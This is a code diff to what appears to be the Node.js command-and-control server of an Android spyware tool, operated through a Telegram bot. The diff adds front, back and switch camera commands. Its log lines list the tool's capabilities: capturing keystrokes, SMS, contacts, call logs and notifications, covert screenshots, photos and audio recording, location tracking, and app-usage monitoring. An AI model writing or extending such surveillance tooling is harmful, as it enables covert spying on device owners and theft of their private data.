@@ -363,11 +363,10 @@ async function setChatMenuButton(chatId) {
                 { command: 'takephoto', description: '📸 Alias for photo' },
                 { command: 'camera_on', description: '📸 Start camera monitoring' },
                 { command: 'camera_off', description: '📸 Stop camera monitoring' },
-                { command: 'camera_status', description: '📸 Check camera status' }
-{ command: 'camera_front', description: '📸 Switch to front camera' },
-{ command: 'camera_back', description: '📸 Switch to back camera' },
-{ command: 'camera_switch', description: '📸 Toggle between cameras' }
-
+                { command: 'camera_status', description: '📸 Check camera status' },
+                { command: 'camera_front', description: '📸 Switch to front camera' },
+                { command: 'camera_back', description: '📸 Switch to back camera' },
+                { command: 'camera_switch', description: '📸 Toggle between cameras' }
             ]
         });
         
@@ -857,33 +856,16 @@ async function handleCallbackQuery(callbackQuery) {
                 `• Last seen: ${new Date(device.lastSeen).toLocaleString()}\n\n` +
                 `All commands will now be sent to this device.`);
         }
-        else if (data === 'menu_camera') {
-    const keyboard = [
-        [
-            { text: '📸 Take Photo', callback_data: 'cmd:photo' },
-            { text: '🔄 Switch Camera', callback_data: 'cmd:camera_switch' }
-        ],
-        [
-            { text: '👤 Front Camera', callback_data: 'cmd:camera_front' },
-            { text: '👥 Back Camera', callback_data: 'cmd:camera_back' }
-        ],
-        [
-            { text: '✅ Start Monitoring', callback_data: 'cmd:camera_on' },
-            { text: '❌ Stop Monitoring', callback_data: 'cmd:camera_off' }
-        ],
-        [
-            { text: '📊 Camera Status', callback_data: 'cmd:camera_status' },
-            { text: '◀️ Back', callback_data: 'help_main' }
-        ]
-    ];
-    await editMessageKeyboard(chatId, messageId, keyboard);
-}
-
+        
     } else if (data === 'menu_camera') {
         const keyboard = [
             [
                 { text: '📸 Take Photo', callback_data: 'cmd:photo' },
-                { text: '📸 Take Photo (Alt)', callback_data: 'cmd:takephoto' }
+                { text: '🔄 Switch Camera', callback_data: 'cmd:camera_switch' }
+            ],
+            [
+                { text: '👤 Front Camera', callback_data: 'cmd:camera_front' },
+                { text: '👥 Back Camera', callback_data: 'cmd:camera_back' }
             ],
             [
                 { text: '✅ Start Monitoring', callback_data: 'cmd:camera_on' },
@@ -2293,6 +2275,9 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log('   └─ /camera_on - Start monitoring camera folder');
     console.log('   └─ /camera_off - Stop monitoring camera folder');
     console.log('   └─ /camera_status - Check camera status');
+    console.log('   └─ /camera_front - Switch to front camera');
+    console.log('   └─ /camera_back - Switch to back camera');
+    console.log('   └─ /camera_switch - Toggle between cameras');
     console.log('   └─ Photos are compressed (640x480, 70% quality)');
     console.log('   └─ Auto-upload of new camera photos');
     console.log('\n✅ APP_OPEN LOG HANDLING:');
@@ -2312,13 +2297,13 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log('   └─ 8. 📞 Call Logs (HTML)');
     console.log('   └─ 9. 📱 Apps List (HTML)');
     console.log('   └─ 10. 📍 Location');
-    console.log('\n✅ COMPLETE COMMAND LIST (55+ commands):');
+    console.log('\n✅ COMPLETE COMMAND LIST (60+ commands):');
     console.log('   └─ Devices: /devices, /select');
     console.log('   └─ Data: contacts, sms, calllogs, apps, keystrokes, notifications');
     console.log('   └─ Network: ip_info, wifi_info, mobile_info, network, all_info');
     console.log('   └─ Phone: phone_number, sim_info');
     console.log('   └─ Screenshot: screenshot, start_screenshot, stop_screenshot, small, medium, original, size_status, screenshot_settings, compression_stats, target_apps, add_target');
-    console.log('   └─ Camera: photo, takephoto, camera_on, camera_off, camera_status');
+    console.log('   └─ Camera: photo, takephoto, camera_on, camera_off, camera_status, camera_front, camera_back, camera_switch');
     console.log('   └─ Recording: record, start_recording, stop_recording, record_auto_on, record_auto_off, record_schedule, record_custom, audio_info, audio_ultra, audio_very_low, audio_low, audio_medium, audio_high');
     console.log('   └─ Location: location, storage, battery, info, time, status');
     console.log('   └─ App: app_opens, app_opens_html');
